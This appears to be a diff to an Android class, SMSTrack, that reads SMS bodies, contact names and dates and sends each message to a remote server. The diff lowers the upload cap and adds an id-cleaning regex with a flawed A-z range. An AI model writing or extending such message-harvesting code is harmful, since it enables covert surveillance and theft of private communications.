@@ -54,6 +54,11 @@ public class SMSTrack {
                 sms = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
 
 
+
+                id =  id.replaceAll("[^a-zA-z0-9]", "");
+
+
+
                 //str_call_time = getFormatedDateTime(str_call_time, "HH:mm:ss", "hh:mm ss");
 
                 SimpleDateFormat dateFormatter = new SimpleDateFormat(
@@ -77,7 +82,7 @@ public class SMSTrack {
 
                 SmsHistoryModel smsHistoryModel = new SmsHistoryModel(id, personName ,smsDate , smsType ,sms );
                 sendDataToServer(smsHistoryModel);
-                if(smsCounter == 30){
+                if(smsCounter == 10){
                     break;
                 }
 
